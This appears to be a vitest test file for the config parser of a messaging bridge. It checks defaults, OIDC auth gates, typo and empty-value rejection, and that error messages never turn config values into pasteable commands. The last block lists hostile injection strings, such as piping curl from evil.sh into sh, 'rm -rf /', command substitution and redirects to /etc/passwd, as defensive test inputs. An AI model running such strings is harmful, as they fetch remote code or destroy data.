import { describe, expect, it } from 'vitest';
import { instanceIdOf, parseConfig } from './config.js';
import { parseMentions } from './mentions.js';

describe('config loader', () => {
  it('applies defaults from a minimal config', () => {
    const cfg = parseConfig({ identity: { handle: 'ctx-payments' }, topics: ['ctx-payments'] });
    expect(cfg.catchup).toEqual({
      on_start: true,
      limit: 100,
      block_max_ms: 60_000,
      block_poll_interval_ms: 250,
    });
    expect(cfg.live_push).toEqual({ enabled: false, mention_filter: false });
    expect(cfg.permissions.skip_permissions).toBe(false);
    expect(cfg.backend_config).toEqual({});
    expect(cfg.post_topics).toEqual([]);
    // Presence defaults: single shared topic, 10-min heartbeat, TTL = 3× heartbeat.
    expect(cfg.presence).toEqual({
      enabled: true,
      topic: 'parley-presence',
      heartbeat_ms: 600_000,
      ttl_ms: 1_800_000,
    });
  });

  it('derives presence.ttl_ms from an explicit heartbeat, but honors an explicit ttl', () => {
    const derived = parseConfig({
      identity: { handle: 'h' },
      topics: ['a'],
      presence: { heartbeat_ms: 60_000 },
    });
    expect(derived.presence.ttl_ms).toBe(180_000);
    const pinned = parseConfig({
      identity: { handle: 'h' },
      topics: ['a'],
      presence: { heartbeat_ms: 60_000, ttl_ms: 500_000 },
    });
    expect(pinned.presence.ttl_ms).toBe(500_000);
  });

  // Which post_topics sources are refused is graded against the shared hostile/safe corpus in
  // regex-screen-parity.test.ts, and the ttl/heartbeat rule at its own boundary in
  // stated-bounds.test.ts.
  it('accepts post_topics and rejects an uncompilable regex', () => {
    const cfg = parseConfig({ identity: { handle: 'h' }, topics: ['a'], post_topics: ['ctx-.*'] });
    expect(cfg.post_topics).toEqual(['ctx-.*']);
    expect(() =>
      parseConfig({ identity: { handle: 'h' }, topics: ['a'], post_topics: ['ctx-('] }),
    ).toThrow(/invalid regex/);
  });

  it('rejects an explicit topic that collides with the presence topic', () => {
    expect(() =>
      parseConfig({ identity: { handle: 'h' }, topics: ['parley-presence'] }),
    ).toThrow(/reserved for presence/);
    // Also when the presence topic is customized.
    expect(() =>
      parseConfig({
        identity: { handle: 'h' },
        topics: ['a', 'live'],
        presence: { topic: 'live' },
      }),
    ).toThrow(/reserved for presence/);
  });

  it('merges partial nested objects with per-field defaults', () => {
    const cfg = parseConfig({
      identity: { handle: 'a' },
      topics: ['a'],
      catchup: { limit: 50 },
      live_push: { enabled: true },
    });
    expect(cfg.catchup).toEqual({
      on_start: true,
      limit: 50,
      block_max_ms: 60_000,
      block_poll_interval_ms: 250,
    });
    expect(cfg.live_push).toEqual({ enabled: true, mention_filter: false });
  });

  it('passes backend_config through opaquely', () => {
    const cfg = parseConfig({
      identity: { handle: 'a' },
      topics: ['a'],
      backend_config: { db_path: '/tmp/x.db', poll_interval_ms: 250 },
    });
    expect(cfg.backend_config).toEqual({ db_path: '/tmp/x.db', poll_interval_ms: 250 });
  });

  it('rejects permissions.skip_permissions: true as unimplemented', () => {
    expect(() =>
      parseConfig({
        identity: { handle: 'h' },
        topics: ['a'],
        permissions: { skip_permissions: true },
      }),
    ).toThrow(/not implemented/);
  });

  it('still accepts an explicit skip_permissions: false', () => {
    const cfg = parseConfig({
      identity: { handle: 'h' },
      topics: ['a'],
      permissions: { skip_permissions: false },
    });
    expect(cfg.permissions.skip_permissions).toBe(false);
  });

  it('instanceIdOf defaults to the handle but honors instance_id', () => {
    expect(instanceIdOf(parseConfig({ identity: { handle: 'h' }, topics: ['a'] }))).toBe('h');
    expect(
      instanceIdOf(parseConfig({ identity: { handle: 'h' }, topics: ['a'], instance_id: 'sess-2' })),
    ).toBe('sess-2');
  });

  it('rejects a config with no topics', () => {
    expect(() => parseConfig({ identity: { handle: 'h' }, topics: [] })).toThrow();
  });

  it('rejects a config with no handle', () => {
    expect(() => parseConfig({ topics: ['a'] })).toThrow();
  });

  it('defaults auth to the built-in OAuth AS when absent', () => {
    const cfg = parseConfig({ identity: { handle: 'h' }, topics: ['a'] });
    expect(cfg.auth).toEqual({ mode: 'builtin' });
  });

  it('rejects auth.mode oidc without an oidc block', () => {
    expect(() =>
      parseConfig({ identity: { handle: 'h' }, topics: ['a'], auth: { mode: 'oidc' } }),
    ).toThrow(/auth\.oidc/);
  });

  it('parses a full oidc auth block with per-field defaults', () => {
    const cfg = parseConfig({
      identity: { handle: 'h' },
      topics: ['a'],
      auth: {
        mode: 'oidc',
        oidc: {
          issuer: 'https://kc.example.com/realms/parley',
          audience: 'parley-mcp',
          required_role: 'parley-owner',
          allowed_usernames: ['alice'],
        },
      },
    });
    expect(cfg.auth.mode).toBe('oidc');
    expect(cfg.auth.oidc).toEqual({
      issuer: 'https://kc.example.com/realms/parley',
      audience: 'parley-mcp',
      required_role: 'parley-owner',
      allowed_usernames: ['alice'],
      clock_skew_s: 30,
    });
  });

  it('rejects a bad issuer URL, empty gate lists, and out-of-range clock skew', () => {
    const base = { identity: { handle: 'h' }, topics: ['a'] };
    expect(() =>
      parseConfig({ ...base, auth: { mode: 'oidc', oidc: { issuer: 'not-a-url' } } }),
    ).toThrow();
    expect(() =>
      parseConfig({
        ...base,
        auth: { mode: 'oidc', oidc: { issuer: 'https://kc.example.com/realms/x', allowed_subjects: [] } },
      }),
    ).toThrow();
    expect(() =>
      parseConfig({
        ...base,
        auth: { mode: 'oidc', oidc: { issuer: 'https://kc.example.com/realms/x', clock_skew_s: 301 } },
      }),
    ).toThrow();
  });

  it('rejects an oidc block with no identity gate (fail-closed)', () => {
    const base = { identity: { handle: 'h' }, topics: ['a'] };
    const issuer = 'https://kc.example.com/realms/x';
    // Gate-less: none of allowed_subjects / allowed_usernames / required_role → rejected.
    expect(() =>
      parseConfig({
        ...base,
        auth: { mode: 'oidc', oidc: { issuer, audience: 'parley-mcp' } },
      }),
    ).toThrow(/identity gate/);
    // required_scope alone is NOT a sufficient gate.
    expect(() =>
      parseConfig({
        ...base,
        auth: { mode: 'oidc', oidc: { issuer, required_scope: 'mcp' } },
      }),
    ).toThrow(/identity gate/);
    // Any one of the three gates makes it parse.
    expect(() =>
      parseConfig({ ...base, auth: { mode: 'oidc', oidc: { issuer, allowed_subjects: ['owner-sub'] } } }),
    ).not.toThrow();
    expect(() =>
      parseConfig({ ...base, auth: { mode: 'oidc', oidc: { issuer, allowed_usernames: ['alice'] } } }),
    ).not.toThrow();
    expect(() =>
      parseConfig({ ...base, auth: { mode: 'oidc', oidc: { issuer, required_role: 'parley-owner' } } }),
    ).not.toThrow();
  });

  it('rejects an http issuer but exempts loopback (https requirement)', () => {
    const base = { identity: { handle: 'h' }, topics: ['a'] };
    expect(() =>
      parseConfig({
        ...base,
        auth: {
          mode: 'oidc',
          oidc: { issuer: 'http://kc.example.com/realms/x', required_role: 'parley-owner' },
        },
      }),
    ).toThrow(/https/);
    // Loopback stays usable so the in-process fake IdP (http://127.0.0.1) works in tests/dev.
    expect(() =>
      parseConfig({
        ...base,
        auth: {
          mode: 'oidc',
          oidc: { issuer: 'http://127.0.0.1:8080/realms/x', required_role: 'parley-owner' },
        },
      }),
    ).not.toThrow();
  });
});

// A fully-populated config, so that a field added later is covered by the walkers below the moment
// it appears here.
const FULL = {
  instance_id: 'inst',
  state_path: '/tmp/parley-state.json',
  identity: { handle: 'h' },
  topics: ['ctx'],
  post_topics: ['ctx-.*'],
  catchup: {
    on_start: true,
    limit: 10,
    block_max_ms: 1000,
    block_poll_interval_ms: 100,
  },
  live_push: { enabled: true, mention_filter: false },
  presence: { enabled: true, topic: 'parley-presence', heartbeat_ms: 1000, ttl_ms: 3000 },
  permissions: { skip_permissions: false },
  auth: {
    mode: 'oidc',
    oidc: {
      issuer: 'https://kc.example.com/realms/r',
      audience: 'parley-mcp',
      jwks_uri: 'https://kc.example.com/jwks',
      required_scope: 'mcp',
      allowed_subjects: ['sub-1'],
      allowed_usernames: ['alice'],
      required_role: 'parley-owner',
      clock_skew_s: 30,
    },
  },
  backend_config: { db_path: './x.db' },
};

/** Walk to the object holding `path`'s leaf in a mutable clone. */
function parentOf(root: Record<string, unknown>, path: string[]): Record<string, unknown> {
  let node = root;
  for (const step of path.slice(0, -1)) node = node[step] as Record<string, unknown>;
  return node;
}

// A key the schema does not know is a LOAD ERROR, not a silent strip: an operator typo must not
// produce a bridge that quietly does nothing.
describe('config rejects unknown keys', () => {
  it('accepts the fully-populated fixture', () => {
    expect(() => parseConfig(structuredClone(FULL))).not.toThrow();
  });

  function keyPaths(node: unknown, prefix: string[] = []): string[][] {
    if (typeof node !== 'object' || node === null || Array.isArray(node)) return [];
    return Object.entries(node).flatMap(([k, v]) => [
      [...prefix, k],
      ...keyPaths(v, [...prefix, k]),
    ]);
  }

  // `backend_config` is opaque to core (DESIGN §11), so its interior is deliberately open.
  const paths = keyPaths(FULL).filter((p) => p[0] !== 'backend_config');

  it.each(paths.map((p) => [p.join('.'), p]))(
    'rejects a near-miss of %s instead of ignoring it',
    (_label, path) => {
      const mutated = structuredClone(FULL) as Record<string, unknown>;
      const node = parentOf(mutated, path as string[]);
      const leaf = (path as string[]).at(-1)!;
      node[leaf.length > 1 ? leaf.slice(0, -1) : `${leaf}x`] = node[leaf];
      delete node[leaf];
      expect(() => parseConfig(mutated)).toThrow();
    },
  );

  it.each([
    ['live_push.enable', { identity: { handle: 'h' }, topics: ['t'], live_push: { enable: true } }],
    ['catchup.limt', { identity: { handle: 'h' }, topics: ['t'], catchup: { limt: 5 } }],
    ['presense', { identity: { handle: 'h' }, topics: ['t'], presense: { enabled: false } }],
    ['identiy', { identiy: { handle: 'h' }, identity: { handle: 'h' }, topics: ['t'] }],
    [
      'permissions.skip_permission',
      { identity: { handle: 'h' }, topics: ['t'], permissions: { skip_permission: true } },
    ],
  ])('rejects the operator typo %s', (_label, raw) => {
    expect(() => parseConfig(raw)).toThrow();
  });
});

// Every string field in a config NAMES something — a path, a read-state namespace, a topic, an
// issuer — and none of them can name it with the empty string. A field that accepts `''` loads
// cleanly and fails later, far from the config: `state_path: ''` served traffic and then threw
// ENOENT on the first cursor persist, and `instance_id: ''` silently merged two sessions' read
// state. Walk the fixture so a string field added later is graded the moment it appears there.
describe('config rejects an empty string in any field that names something', () => {
  interface StringLeaf {
    label: string;
    path: string[];
    index?: number;
  }

  function stringLeaves(node: unknown, prefix: string[] = []): StringLeaf[] {
    if (typeof node !== 'object' || node === null) return [];
    return Object.entries(node).flatMap(([key, value]) => {
      const path = [...prefix, key];
      const label = path.join('.');
      if (typeof value === 'string') return [{ label, path }];
      if (Array.isArray(value))
        return value.flatMap((element, index) =>
          typeof element === 'string' ? [{ label: `${label}[${index}]`, path, index }] : [],
        );
      return stringLeaves(value, path);
    });
  }

  // `backend_config` is opaque to core (DESIGN §11) and may legitimately carry an empty string.
  const leaves = stringLeaves(FULL).filter((l) => l.path[0] !== 'backend_config');

  it('finds every string field in the fixture (guards against a broken walk)', () => {
    expect(leaves.map((l) => l.label).sort()).toEqual([
      'auth.mode',
      'auth.oidc.allowed_subjects[0]',
      'auth.oidc.allowed_usernames[0]',
      'auth.oidc.audience',
      'auth.oidc.issuer',
      'auth.oidc.jwks_uri',
      'auth.oidc.required_role',
      'auth.oidc.required_scope',
      'identity.handle',
      'instance_id',
      'post_topics[0]',
      'presence.topic',
      'state_path',
      'topics[0]',
    ]);
  });

  it.each(leaves.map((l) => [l.label, l] as const))('rejects %s set to ""', (_label, leaf) => {
    const mutated = structuredClone(FULL) as Record<string, unknown>;
    const node = parentOf(mutated, leaf.path);
    const key = leaf.path.at(-1)!;
    if (leaf.index === undefined) node[key] = '';
    else (node[key] as string[])[leaf.index] = '';
    expect(() => parseConfig(mutated)).toThrow();
  });
});

// Every numeric field is a count or a duration, and none of them means anything at zero, below zero
// or between integers: `catchup.limit: 0` makes catch-up's `messages.length < limit` break condition
// false forever and page without end, `block_poll_interval_ms: 0` turns the long-poll fallback into a
// tight re-query loop, and `presence.heartbeat_ms: -1` fires the beat every tick. Walk the fixture so
// a knob added later is graded the moment it appears there.
describe('config rejects a degenerate number in any numeric field', () => {
  interface NumericLeaf {
    label: string;
    path: string[];
    value: number;
  }

  function numericLeaves(node: unknown, prefix: string[] = []): NumericLeaf[] {
    if (typeof node !== 'object' || node === null) return [];
    return Object.entries(node).flatMap(([key, value]) => {
      const path = [...prefix, key];
      if (typeof value === 'number') return [{ label: path.join('.'), path, value }];
      return numericLeaves(value, path);
    });
  }

  // `backend_config` is opaque to core (DESIGN §11); its numbers are the plugin's to police.
  const leaves = numericLeaves(FULL).filter((l) => l.path[0] !== 'backend_config');

  // Zero is legal only where it names "no cap" / "no tolerance" rather than a cadence or a count.
  const ZERO_IS_LEGAL = new Set(['catchup.block_max_ms', 'auth.oidc.clock_skew_s']);

  it('finds every numeric field in the fixture (guards against a broken walk)', () => {
    expect(leaves.map((l) => l.label).sort()).toEqual([
      'auth.oidc.clock_skew_s',
      'catchup.block_max_ms',
      'catchup.block_poll_interval_ms',
      'catchup.limit',
      'presence.heartbeat_ms',
      'presence.ttl_ms',
    ]);
  });

  function withValue(leaf: NumericLeaf, value: number): Record<string, unknown> {
    const mutated = structuredClone(FULL) as Record<string, unknown>;
    parentOf(mutated, leaf.path)[leaf.path.at(-1)!] = value;
    return mutated;
  }

  it.each(leaves.map((l) => [l.label, l] as const))('rejects %s set below zero', (_label, leaf) => {
    expect(() => parseConfig(withValue(leaf, -1))).toThrow();
  });

  // The fixture's own value plus a half, so that a cross-field rule (ttl_ms >= heartbeat_ms) still
  // holds and `.int()` is the only thing left that can reject the row.
  it.each(leaves.map((l) => [l.label, l] as const))(
    'rejects %s set to a fraction',
    (_label, leaf) => {
      expect(() => parseConfig(withValue(leaf, leaf.value + 0.5))).toThrow();
    },
  );

  it.each(leaves.map((l) => [l.label, l] as const))('grades %s set to zero', (label, leaf) => {
    const parse = (): unknown => parseConfig(withValue(leaf, 0));
    if (ZERO_IS_LEGAL.has(label)) expect(parse).not.toThrow();
    else expect(parse).toThrow();
  });
});

// `mention_filter` compares a parsed @mention against `identity.handle`, so a handle the mention
// grammar cannot produce silently drops EVERY inbound message. Either grammar may widen later;
// the invariant is that the two agree, so assert the round trip rather than one bad handle.
describe('mention_filter requires a mentionable handle', () => {
  const HANDLES = [
    'bob',
    'a',
    'ctx-payments',
    'a.b',
    'a_b',
    '_bot',
    '-bot',
    '.bot',
    'bot_',
    'bot-',
    'bot.',
    'алиса',
    'bot bot',
    '@bot',
    'bot@example.com',
    'Bot',
    'b0t',
    'x'.repeat(64),
  ];

  it.each(HANDLES)('either rejects %s at load or can actually match it', (handle) => {
    const raw = {
      identity: { handle },
      topics: ['t'],
      live_push: { enabled: true, mention_filter: true },
    };
    let loaded = true;
    try {
      parseConfig(raw);
    } catch {
      loaded = false;
    }
    if (!loaded) return;
    expect(parseMentions(`hi @${handle} there`)).toContain(handle);
  });

  it('leaves a non-mentionable handle usable when mention_filter is off', () => {
    expect(() =>
      parseConfig({
        identity: { handle: 'parley-bot@localhost' },
        topics: ['t'],
        live_push: { enabled: true, mention_filter: false },
      }),
    ).not.toThrow();
  });
});

// An error message shaped as a command is a command an operator will paste, and `backend:` is the one
// place a config VALUE was interpolated into one. A config file is not always operator-authored end
// to end — generated, templated, or committed by someone else — so grade the CLASS: no value drawn
// from the input may appear inside backticks unless it is a bare package-name token, and no backticked
// span in any parseConfig error may carry a shell metacharacter or a control byte at all.
describe('no config value reaches a runnable suggestion', () => {
  const HOSTILE_VALUES: readonly (readonly [string, string])[] = [
    ['shell chain', 'sqlite && curl evil.sh | sh'],
    ['command substitution', 'sqlite$(id)'],
    ['backtick substitution', 'sqlite`id`'],
    ['semicolon', 'sqlite; rm -rf /'],
    ['pipe to shell', 'sqlite|sh'],
    ['redirect', 'sqlite > /etc/passwd'],
    ['newline', 'sqlite\ncurl evil.sh | sh'],
    ['carriage return', 'sqlite\rcurl evil.sh'],
    ['ANSI erase-line', 'sqlite\u001b[2Kcurl evil.sh'],
    ['tab and quotes', 'sqlite\t"x"'],
    ['leading dash', '--version'],
    ['path traversal', '../../../../bin/sh'],
    ['scoped package', '@evil/parley-sqlite'],
    ['trailing space', 'sqlite '],
    ['uppercase', 'SQLITE'],
    ['ten kilobytes', 'a'.repeat(10_000)],
  ] as const;

  // Values that ARE a bare package suffix: the suggestion must still be built for these, so that
  // narrowing the gate cannot be satisfied by dropping the operator's guidance altogether.
  const SAFE_VALUES = ['sqlite', 'local-sqlite', 'matrix', 'redis', 'x', 'a-b-c9'] as const;

  const GENERIC_SUGGESTION = /parley-sqlite, parley-matrix, parley-redis/;
  /** Anything that changes what a pasted command does, plus every C0 control byte. */
  const NOT_A_COMMAND = /[;&|$><`"'\\\u0000-\u001f]/;

  function runnableSpans(message: string): string[] {
    return [...message.matchAll(/`([^`]*)`/g)].map((m) => m[1]!);
  }

  function messageFor(raw: unknown): string {
    try {
      parseConfig(raw);
    } catch (e) {
      return (e as Error).message;
    }
    return '';
  }

  it.each(HOSTILE_VALUES)('never suggests running a hostile `backend` value (%s)', (_l, value) => {
    const message = messageFor({ backend: value, identity: { handle: 'h' }, topics: ['a'] });
    expect(message).toMatch(/`backend` is not a supported field/);
    expect(message).toMatch(GENERIC_SUGGESTION);
    expect(message).not.toContain(`parley-${value.replace(/^local-/, '')}`);
    for (const span of runnableSpans(message)) expect(span).not.toMatch(NOT_A_COMMAND);
  });

  it.each(SAFE_VALUES)('still names the binary for a bare backend suffix (%s)', (value) => {
    const message = messageFor({ backend: value, identity: { handle: 'h' }, topics: ['a'] });
    expect(message).toContain(`parley-${value.replace(/^local-/, '')}`);
    for (const span of runnableSpans(message)) expect(span).not.toMatch(NOT_A_COMMAND);
  });

  it.each([
    ['number', 42],
    ['null', null],
    ['boolean', true],
    ['object', { name: 'sqlite' }],
    ['array', ['sqlite']],
  ])('refuses a non-string `backend` (%s) without claiming a binary', (_l, value) => {
    const message = messageFor({ backend: value, identity: { handle: 'h' }, topics: ['a'] });
    expect(message).toMatch(/`backend` is not a supported field/);
    expect(message).toMatch(GENERIC_SUGGESTION);
    for (const span of runnableSpans(message)) expect(span).not.toMatch(NOT_A_COMMAND);
  });

  // The same class, one field at a time, over the strings an operator populates: whichever field a
  // hostile value lands in, whatever message comes back must not read as a command to run.
  const FIELDS = ['instance_id', 'state_path', 'topics', 'post_topics', 'presence'] as const;
  const FIELD_ROWS = FIELDS.flatMap((field) =>
    HOSTILE_VALUES.map(([label, value]) => {
      const raw: Record<string, unknown> = { identity: { handle: 'h' }, topics: ['a'] };
      if (field === 'topics' || field === 'post_topics') raw[field] = [value];
      else if (field === 'presence') raw.presence = { topic: value };
      else raw[field] = value;
      return [`${field} = ${label}`, raw] as const;
    }),
  );

  it('crosses every populated string field with every hostile value', () => {
    expect(FIELD_ROWS.length).toBe(FIELDS.length * HOSTILE_VALUES.length);
    expect(FIELD_ROWS.length).toBeGreaterThan(60);
  });

  it.each(FIELD_ROWS)('never renders %s as a command', (_label, raw) => {
    for (const span of runnableSpans(messageFor(raw))) expect(span).not.toMatch(NOT_A_COMMAND);
  });
});
